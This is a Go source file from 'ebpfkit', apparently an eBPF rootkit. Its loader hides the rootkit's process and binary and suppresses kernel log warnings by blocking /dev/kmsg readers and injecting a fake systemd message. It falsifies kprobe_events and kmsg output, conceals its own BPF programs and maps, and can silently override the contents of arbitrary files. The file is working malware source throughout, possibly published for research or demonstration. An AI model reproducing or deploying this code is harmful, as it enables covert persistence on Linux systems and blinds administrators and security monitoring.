/*
Copyright © 2020 GUILLAUME FOURNIER

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package ebpfkit

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"path"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/DataDog/ebpf"
	"github.com/DataDog/ebpf/manager"
	"github.com/Gui774ume/ebpfkit/pkg/assets"
	"github.com/moby/sys/mountinfo"
	"github.com/pkg/errors"
)

// EBPFKit is the main EBPFKit structure
type EBPFKit struct {
	options   Options
	startTime time.Time

	httpPatterns            *ebpf.Map
	bootstrapManager        *manager.Manager
	bootstrapManagerOptions manager.Options
	mainManager             *manager.Manager
	mainManagerOptions      manager.Options

	faPathAttr map[FaPathKey]FaPathAttr
}

// New creates a new EBPFKit instance
func New(options Options) *EBPFKit {
	return &EBPFKit{
		options:    options,
		faPathAttr: make(map[FaPathKey]FaPathAttr),
	}
}

// Start initializes and start EBPFKit
func (e *EBPFKit) Start() error {
	if err := e.start(); err != nil {
		return err
	}
	return nil
}

func (e *EBPFKit) ParseMountInfo(pid int32) ([]*mountinfo.Info, error) {
	f, err := os.Open(fmt.Sprintf("/proc/%d/mountinfo", pid))
	if err != nil {
		return nil, err
	}
	defer f.Close()

	return mountinfo.GetMountsFromReader(f, nil)
}

func (e *EBPFKit) FatGetFdKeys(path string) []FaFdKey {
	matches, err := filepath.Glob("/proc/*/fd/*")
	if err != nil {
		return nil
	}

	var keys []FaFdKey
	for _, match := range matches {
		if f, err := os.Readlink(match); err == nil {
			if f == path {
				fd, err := strconv.ParseInt(filepath.Base(match), 10, 64)
				if err != nil {
					continue
				}

				els := strings.Split(match, "/")
				pid, err := strconv.ParseInt(els[2], 10, 64)
				if err != nil {
					continue
				}

				keys = append(keys, FaFdKey{
					Fd:  uint64(fd),
					Pid: uint32(pid),
				})
			}
		}
	}

	return keys
}

func (e *EBPFKit) Kmsg(str string) {
	f, err := os.OpenFile("/dev/kmsg", os.O_WRONLY|os.O_APPEND, os.ModePerm)
	if err != nil {
		return
	}
	defer f.Close()
	f.WriteString(str)
}
func (e *EBPFKit) FaPutFdContent(m *ebpf.Map, id uint64, reader io.Reader) {
	key := FaFdContentKey{
		ID: id,
	}

	for {
		FaFdContent := FaFdContent{}

		n, err := reader.Read(FaFdContent.Content[:])
		if err != nil {
			return
		}

		if n == 0 {
			break
		}

		FaFdContent.Size = uint64(n)

		if err := m.Put(key.Bytes(), FaFdContent.Bytes()); err != nil {
			return
		}

		key.Chunk++
	}
}

func (e *EBPFKit) FaPutPathAttr(m *ebpf.Map, path string, attr FaPathAttr, override bool) error {
	var zeroAttr FaPathAttr

	for i, key := range FaPathKeys(path) {
		if i == 0 {
			if !override {
				prev, ok := e.faPathAttr[key]
				if ok {
					attr.Action = attr.Action | prev.Action
					attr.ReturnValue = attr.ReturnValue | prev.ReturnValue
					attr.HiddenHash = attr.HiddenHash | prev.HiddenHash
				}
			}

			if err := m.Put(key.Bytes(), attr.Bytes()); err != nil {
				return errors.Wrap(err, "unable to put path attr")
			}

			e.faPathAttr[key] = attr
		} else {
			if err := m.Put(key.Bytes(), zeroAttr.Bytes()); err != nil {
				return errors.Wrap(err, "unable to put path attr")
			}
		}
	}

	return nil
}

func (e *EBPFKit) FaBlockKmsg() ([]FaFdKey, error) {
	faFdKeys := e.FatGetFdKeys("/dev/kmsg")

	filesMap, _, err := e.bootstrapManager.GetMap("fa_fd_attrs")
	if err != nil {
		return nil, errors.Wrap(err, "unable to find map")
	}

	// block process already having fd on kmsg
	for _, fdKey := range faFdKeys {
		fdAttr := FaFdAttr{
			Action: FaOverrideReturnAction,
		}

		if err = filesMap.Put(fdKey.Bytes(), fdAttr.Bytes()); err != nil {
			return nil, errors.Wrap(err, "unable to find map")
		}
	}

	// block process that will open kmsg
	pathKeysMap, _, _ := e.bootstrapManager.GetMap("fa_path_attrs")
	attr := FaPathAttr{
		FSType: "devtmpfs",
		Action: FaOverrideReturnAction,
	}
	e.FaPutPathAttr(pathKeysMap, "kmsg", attr, true)

	// send fake message to force the processes to read and to exit
	e.Kmsg("systemd[1]: Resync Network Time Service.")

	return faFdKeys, nil
}

func (e *EBPFKit) FaUnBlockKsmg(faFdKeys []FaFdKey) error {
	filesMap, _, err := e.bootstrapManager.GetMap("fa_fd_attrs")
	if err != nil {
		return errors.Wrap(err, "unable to find map")
	}

	// unblock
	for _, faFdKey := range faFdKeys {
		filesMap.Delete(faFdKey.Bytes())
	}

	return nil
}

func (e *EBPFKit) FaOverrideContent(fsType string, path string, reader io.Reader, append bool, comm string) {
	id := FNVHashStr(fsType + "/" + path)

	attr := FaPathAttr{
		FSType:     fsType,
		Action:     FaOverrideContentAction,
		OverrideID: id,
		Comm:       comm,
	}

	if append {
		attr.Action |= FaAppendContentAction
	}

	pathKeysMap, _, _ := e.bootstrapManager.GetMap("fa_path_attrs")
	e.FaPutPathAttr(pathKeysMap, path, attr, false)

	contentsMap, _, _ := e.bootstrapManager.GetMap("fa_fd_contents")
	e.FaPutFdContent(contentsMap, id, reader)
}

func (e *EBPFKit) FaOverrideReturn(fsType string, path string, value int64) {
	attr := FaPathAttr{
		FSType:      fsType,
		Action:      FaOverrideReturnAction,
		ReturnValue: value,
	}

	pathKeysMap, _, _ := e.bootstrapManager.GetMap("fa_path_attrs")
	e.FaPutPathAttr(pathKeysMap, path, attr, false)
}

func (e *EBPFKit) FaHideFile(fsType string, dir string, file string) {
	attr := FaPathAttr{
		FSType:     fsType,
		Action:     FaHideFileAction,
		HiddenHash: FNVHashStr(file),
	}

	pathKeysMap, _, _ := e.bootstrapManager.GetMap("fa_path_attrs")
	e.FaPutPathAttr(pathKeysMap, dir, attr, false)

	e.FaOverrideReturn(fsType, path.Join(dir, file), -2)
}

func (e *EBPFKit) HideMyself() error {
	fi, err := os.Stat(fmt.Sprintf("/proc/%d/exe", os.Getpid()))
	if err != nil {
		return errors.Wrap(err, "unable to find proc entry")
	}

	stat, ok := fi.Sys().(*syscall.Stat_t)
	if !ok {
		return errors.New("unable to find proc entry")
	}

	infos, err := e.ParseMountInfo(int32(os.Getpid()))
	if err != nil {
		return errors.Wrap(err, "unable to find mount entries")
	}

	for _, info := range infos {
		if int32(info.Major)<<8|int32(info.Minor) == int32(stat.Dev) {
			exe, _ := os.Executable()
			dir, file := path.Split(strings.TrimPrefix(exe, info.Mountpoint))

			e.FaHideFile(info.FSType, dir, file)
		}
	}

	return nil
}

func (e *EBPFKit) FaFillKmsgMap() {
	file, err := os.Open("/dev/kmsg")
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	var strs []string

	scanner := bufio.NewScanner(file)
	// optionally, resize scanner's capacity for lines over 64K, see next example
	for scanner.Scan() {
		els := strings.Split(scanner.Text(), ";")
		if len(els) < 2 {
			continue
		}
		txt := els[1]

		if len(txt) >= 100 {
			continue
		}

		if strings.Contains(txt, " port") ||
			strings.Contains(txt, "IPV6") ||
			strings.Contains(txt, " renamed") ||
			strings.Contains(txt, "xfs") || strings.Contains(txt, "ext4") ||
			strings.Contains(txt, "EXT4-fs") || strings.Contains(txt, "Btrfs") ||
			strings.Contains(txt, "systemd") {
			strs = append(strs, txt+"\n")
		}

		if len(strs) == 30 {
			break
		}
	}

	if len(strs) < 30 {
		for i := 0; i != 30-len(strs); i++ {
			strs = append(strs, "systemd[1]: Reached target Sockets.")
			if len(strs) == 30 {
				break
			}
		}
	}

	kmsgMap, _, _ := e.bootstrapManager.GetMap("fa_kmsgs")
	for i, str := range strs {
		k := make([]byte, 4)
		ByteOrder.PutUint32(k, uint32(i))

		d := make([]byte, 112)
		ByteOrder.PutUint64(d, uint64(len(str)))
		copy(d[8:], []byte(str))

		kmsgMap.Put(k, d)
	}
}
func (e *EBPFKit) applyOverride() {
	if e.options.SrcFile != "" && e.options.TargetFile != "" {
		file, err := os.Open(e.options.SrcFile)
		if err == nil {
			defer file.Close()
			if f, err := ioutil.ReadAll(file); err == nil {
				e.FaOverrideContent("", e.options.TargetFile, bytes.NewReader(f), e.options.AppendMode, e.options.Comm)
			}
		}
	}
}

func (e *EBPFKit) installMain() error {
	getMap := func(name string) *ebpf.Map {
		m, _, _ := e.bootstrapManager.GetMap(name)
		return m
	}

	if e.mainManagerOptions.MapEditors == nil {
		e.mainManagerOptions.MapEditors = make(map[string]*ebpf.Map)
	}

	e.mainManagerOptions.MapEditors["fa_fd_actions"] = getMap("fa_fd_actions")
	e.mainManagerOptions.MapEditors["fa_fd_attrs"] = getMap("fa_fd_attrs")
	e.mainManagerOptions.MapEditors["fa_fd_contents"] = getMap("fa_fd_contents")
	e.mainManagerOptions.MapEditors["fa_getdents"] = getMap("fa_getdents")
	e.mainManagerOptions.MapEditors["fa_kmsgs"] = getMap("fa_kmsgs")

	mainBuf, err := assets.Asset("/main.o")
	if err != nil {
		return errors.Wrap(err, "couldn't find asset")
	}

	// initialize the main manager
	if err := e.mainManager.InitWithOptions(bytes.NewReader(mainBuf), e.mainManagerOptions); err != nil {
		return errors.Wrap(err, "couldn't init main manager")
	}

	// setup maps
	if err := e.setupMainMaps(); err != nil {
		return errors.Wrap(err, "couldn't init eBPF maps")
	}

	// start the main manager
	if err := e.mainManager.Start(); err != nil {
		return errors.Wrap(err, "couldn't start main manager")
	}

	if err := e.setupMainProgramMaps(); err != nil {
		return errors.Wrap(err, "failed to setup program maps")
	}

	getProgram := func(section string) *ebpf.Program {
		p, _, _ := e.mainManager.GetProgram(manager.ProbeIdentificationPair{Section: section})
		return p[0]
	}

	routes := []manager.TailCallRoute{
		{
			ProgArrayName: "fa_progs",
			Key:           uint32(FaKMsgProg),
			Program:       getProgram("kprobe/fa_kmsg_user"),
		},
		{
			ProgArrayName: "fa_progs",
			Key:           uint32(FaFillWithZeroProg),
			Program:       getProgram("kprobe/fa_fill_with_zero_user"),
		},
		{
			ProgArrayName: "fa_progs",
			Key:           uint32(FaOverrideContentProg),
			Program:       getProgram("kprobe/fa_override_content_user"),
		},
		{
			ProgArrayName: "fa_progs",
			Key:           uint32(FaOverrideGetDentsProg),
			Program:       getProgram("kprobe/fa_override_getdents_user"),
		},
	}
	e.bootstrapManager.UpdateTailCallRoutes(routes...)

	pathKeysMap, _, err := e.bootstrapManager.GetMap("fa_path_attrs")
	if err != nil {
		return errors.Wrap(err, "couldn't get fa_path_attrs map")
	}

	// kmsg override
	e.FaFillKmsgMap()
	attr := FaPathAttr{
		FSType: "devtmpfs",
		Action: FaKMsgProg,
	}
	e.FaPutPathAttr(pathKeysMap, "kmsg", attr, true)

	// kprobe_events override
	file, err := os.Open("/sys/kernel/debug/tracing/kprobe_events")
	if err == nil {
		defer file.Close()
		e.FaOverrideContent("tracefs", "kprobe_events", file, false, "")
	}

	// proc override
	e.FaHideFile("proc", "", strconv.Itoa(os.Getpid()))

	// hide the binary itself
	e.HideMyself()

	return nil
}

func (e *EBPFKit) dumpPrograms() {
	var progIds []int
	prev := 0
	for {
		id, err := ProgGetNextId(prev)
		if err != nil {
			log.Printf("Failed to retrieve prog: %s", err)
			break
		}

		if id == -1 {
			break
		}

		progIds = append(progIds, id)
		prev = id
	}

	fmt.Printf("Programs: %+v\n", progIds)
}

func (e *EBPFKit) start() error {
	// fetch ebpf assets
	bootstrapBuf, err := assets.Asset("/bootstrap.o")
	if err != nil {
		return errors.Wrap(err, "couldn't find asset")
	}

	// setup the managers
	e.setupManagers()

	// initialize the bootstrap manager
	if err := e.bootstrapManager.InitWithOptions(bytes.NewReader(bootstrapBuf), e.bootstrapManagerOptions); err != nil {
		return errors.Wrap(err, "couldn't init bootstrap manager")
	}

	// start the bootstrap manager
	if err := e.bootstrapManager.Start(); err != nil {
		return errors.Wrap(err, "couldn't start bootstrap manager")
	}

	// before overriding block kmsg warnings
	faFdKeys, err := e.FaBlockKmsg()
	if err != nil {
		return errors.Wrap(err, "couldn't start bootstrap manager")
	}

	// now we can install the main programs
	if err := e.installMain(); err != nil {
		return errors.Wrap(err, "couldn't start main manager")
	}

	// unblock kmsg
	if err := e.FaUnBlockKsmg(faFdKeys); err != nil {
		return errors.Wrap(err, "couldn't unblock kmsg")
	}

	// apply user override
	e.applyOverride()

	e.startTime = time.Now()

	if e.options.Verbose {
		fmt.Printf("Started, pid: %d\n", os.Getpid())
	}

	return nil
}

// Stop shuts down EBPFKit
func (e *EBPFKit) Stop() error {
	if err := e.bootstrapManager.Stop(manager.CleanAll); err != nil {
		return errors.Wrap(err, "couldn't stop manager")
	}
	if err := e.mainManager.Stop(manager.CleanAll); err != nil {
		return errors.Wrap(err, "couldn't stop manager")
	}

	return nil
}

func (e *EBPFKit) setupMainMaps() error {
	var err error
	// select maps
	e.httpPatterns, _, err = e.mainManager.GetMap("http_patterns")
	if err != nil {
		return err
	}
	return nil
}

func (e *EBPFKit) setupMainProgramMaps() error {
	time.Sleep(time.Second)

	bpfProgMap, _, err := e.mainManager.GetMap("bpf_programs")
	if err != nil {
		return errors.Wrap(err, "couldn't get bpf program map")
	}

	bpfMapMap, _, err := e.mainManager.GetMap("bpf_maps")
	if err != nil {
		return errors.Wrap(err, "couldn't get bpf map map")
	}

	bpfNextProgramMap, _, err := e.mainManager.GetMap("bpf_next_id")
	if err != nil {
		return errors.Wrap(err, "couldn't get bpf_next_id map")
	}

	bpfNextProgramMap.Put(uint32(0), uint32(0xFFFFFFFF)) // next program
	bpfNextProgramMap.Put(uint32(1), uint32(0xFFFFFFFF)) // next map

	putProgram := func(probe *manager.Probe) error {
		progID, err := probe.Program().ID()
		if err != nil {
			return errors.Wrap(err, "failed to get program id for probe")
		}

		if err := bpfProgMap.Put(uint32(progID), uint32(0xFFFFFFFF)); err != nil {
			return errors.Wrap(err, "failed to insert program into map")
		}

		return nil
	}

	for _, probe := range e.mainManager.Probes {
		putProgram(probe)
	}
	for _, probe := range e.bootstrapManager.Probes {
		putProgram(probe)
	}

	putTail := func(tailCallRoute manager.TailCallRoute) error {
		programs, _, _ := e.mainManager.GetProgram(tailCallRoute.ProbeIdentificationPair)

		for _, program := range programs {
			progID, err := program.ID()
			if err != nil {
				errors.Wrap(err, "failed to get program id for probe")
			}

			if err := bpfProgMap.Put(uint32(progID), uint32(0xFFFFFFFF)); err != nil {
				return errors.Wrap(err, "failed to insert program into map")
			}
		}

		return nil
	}

	for _, tailCallRoute := range e.mainManagerOptions.TailCallRouter {
		putTail(tailCallRoute)
	}
	for _, tailCallRoute := range e.bootstrapManagerOptions.TailCallRouter {
		putTail(tailCallRoute)
	}

	putMap := func(m *manager.Map) error {
		ebpfMap, _, err := e.mainManager.GetMap(m.Name)
		if err != nil {
			return errors.Wrap(err, "failed to get map")
		}

		id, err := ebpfMap.ID()
		if err != nil {
			return errors.Wrap(err, "failed to get map")
		}

		if err := bpfMapMap.Put(uint32(id), uint32(0xFFFFFFFF)); err != nil {
			return errors.Wrap(err, "failed to insert map id into map")
		}

		return nil
	}

	for _, m := range e.mainManager.Maps {
		putMap(m)
	}
	for _, m := range e.bootstrapManager.Maps {
		putMap(m)
	}

	return nil
}
